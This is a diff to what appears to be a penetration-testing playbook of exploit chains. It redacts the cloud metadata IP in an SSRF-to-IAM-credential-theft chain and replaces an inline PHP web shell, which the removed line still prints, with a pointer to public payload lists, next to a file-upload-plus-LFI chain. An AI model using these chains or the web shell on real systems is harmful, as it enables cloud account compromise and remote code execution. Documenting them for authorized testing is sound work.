@@ -63,9 +63,9 @@ fetch('/account/email', {method:'POST', credentials:'include',
 - Application hosted on AWS (EC2/ECS/Lambda) without IMDSv2
 
 **Chain:**
-1. SSRF to `http://169.254.169.254/latest/meta-data/iam/security-credentials/`
+1. SSRF to `http://[cloud-imds-ip]/latest/meta-data/iam/security-credentials/`
 2. Get IAM role name from response
-3. SSRF to `http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>`
+3. SSRF to `http://[cloud-imds-ip]/latest/meta-data/iam/security-credentials/<role>`
 4. Extract `AccessKeyId`, `SecretAccessKey`, `Token`
 5. Use credentials: `aws s3 ls --profile attacker` → full AWS API access
 6. If role has `AdministratorAccess` → **full cloud account compromise**
@@ -83,7 +83,7 @@ fetch('/account/email', {method:'POST', credentials:'include',
 - File upload anywhere on the application (even image upload)
 
 **Chain:**
-1. Upload file with PHP code disguised as image: `evil.jpg` with content `<?php system($_GET['c']); ?>`
+1. Upload a PHP file disguised as image (`evil.jpg`) containing a minimal code execution payload — a one-liner that passes a GET parameter to an OS command function. Exact payload: HackTricks "LFI + File Upload" or PayloadsAllTheThings "File Upload".
 2. Note the upload path (e.g., `/uploads/evil.jpg`)
 3. Trigger LFI to include the uploaded file:
    `?page=../uploads/evil.jpg`
